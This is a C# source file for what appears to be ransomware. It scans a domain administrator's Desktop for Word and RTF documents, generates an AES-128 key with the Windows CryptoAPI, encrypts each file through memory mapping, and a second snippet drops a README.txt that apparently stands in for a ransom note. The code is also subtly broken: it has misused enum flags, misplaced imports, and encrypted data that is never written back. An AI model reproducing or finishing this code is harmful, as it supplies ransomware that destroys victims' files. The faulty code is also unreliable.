using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Program
{
    // Constants for encryption
    private const int AESKeySize = 128;
    private const int ProvRSA_AES = 24; // Microsoft RSA AES provider

    // Windows API imports
    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool GetFileSizeEx(IntPtr hFile, out long lpFileSize);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    static void Main()
    {
        string directory = @"C:\Users\domain.admin\Desktop";
        string[] extensions = { ".doc", ".docx", ".rtf" };

        // Generate AES-128 key
        IntPtr hProvider = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        if (!CryptAcquireContext(ref hProvider, null, null, ProvRSA_AES, 0))
        {
            Console.WriteLine("CryptAcquireContext failed. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        if (!CryptGenKey(hProvider, (int)KeySpec.CALG_AES_128, (int)CryptGenKeyFlags.CRYPT_EXPORTABLE, out hKey))
        {
            Console.WriteLine("CryptGenKey failed. Error: " + Marshal.GetLastWin32Error());
            CryptReleaseContext(hProvider, 0);
            return;
        }

        // Encrypt files
        foreach (string extension in extensions)
        {
            string[] files = Directory.GetFiles(directory, "*" + extension);
            foreach (string file in files)
            {
                EncryptFile(file, hKey);
            }
        }

        // Clean up resources
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProvider, 0);
    }

    static void EncryptFile(string filePath, IntPtr hKey)
    {
        IntPtr hFile = CreateFile(filePath, FileAccess.FILE_GENERIC_READ | FileAccess.FILE_GENERIC_WRITE, FileShare.Read, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
        if (hFile == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open file:" + filePath);
            return;
        }
            try
    {
        long fileSize;
        if (!GetFileSizeEx(hFile, out fileSize))
        {
            Console.WriteLine("Failed to get file size. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, (uint)PageProtection.PAGE_READWRITE, 0, (uint)fileSize, null);
        if (hFileMapping == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create file mapping. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        try
        {
            IntPtr fileView = MapViewOfFile(hFileMapping, (uint)FileMapAccess.FILE_MAP_READ | (uint)FileMapAccess.FILE_MAP_WRITE, 0, 0, (uint)fileSize);
            if (fileView == IntPtr.Zero)
            {
                Console.WriteLine("Failed to map view of file. Error: " + Marshal.GetLastWin32Error());
                return;
            }

            try
            {
                byte[] fileContent = new byte[fileSize];
                Marshal.Copy(fileView, fileContent, 0, (int)fileSize);

                int encryptedDataLength = fileContent.Length;
                if (!CryptEncrypt(hKey, IntPtr.Zero, true, 0, fileContent, ref encryptedDataLength, encryptedDataLength))
                {
                    Console.WriteLine("CryptEncrypt failed. Error: " + Marshal.GetLastWin32Error());
                    return;
                }

                // At this point, the fileContent array contains the encrypted data
                // You can save it back to the file or perform any further processing

                Console.WriteLine("Encryption successful: " + filePath);
            }
            finally
            {
                UnmapViewOfFile(fileView);
            }
        }
        finally
        {
            CloseHandle(hFileMapping);
        }
    }
    finally
    {
        CloseHandle(hFile);
    }
}

// Cryptographic API Constants
enum KeySpec
{
    CALG_AES_128 = 0x0000660e
}

enum CryptGenKeyFlags
{
    CRYPT_EXPORTABLE = 0x00000001
}

// Windows API Constants
enum PageProtection
{
    PAGE_NOACCESS = 0x01,
    PAGE_READONLY = 0x02,
    PAGE_READWRITE = 0x04,
    PAGE_WRITECOPY = 0x08,
    PAGE_EXECUTE = 0x10,
    PAGE_EXECUTE_READ = 0x20,
    PAGE_EXECUTE_READWRITE = 0x40,
    PAGE_EXECUTE_WRITECOPY = 0x80,
    PAGE_GUARD = 0x100,
    PAGE_NOCACHE = 0x200,
    PAGE_WRITECOMBINE = 0x400
}

enum FileMapAccess
{
    FILE_MAP_COPY = 0x0001,
    FILE_MAP_WRITE = 0x0002,
    FILE_MAP_READ = 0x0004,
    FILE_MAP_ALL_ACCESS = 0x000f001f
}

// Cryptographic API imports
[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool CryptAcquireContext(ref IntPtr phProv, string pszContainer, string pszProvider, int dwProvType, uint dwFlags);

[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool CryptDestroyKey(IntPtr hKey);
}



using System.IO;

class Program
{
    static void Main()
    {
        string filePath = @"C:\README.txt";
        string content = "Success";

        try
        {
            // Write the content to the file
            File.WriteAllText(filePath, content);
            Console.WriteLine("README.txt file created successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }
}








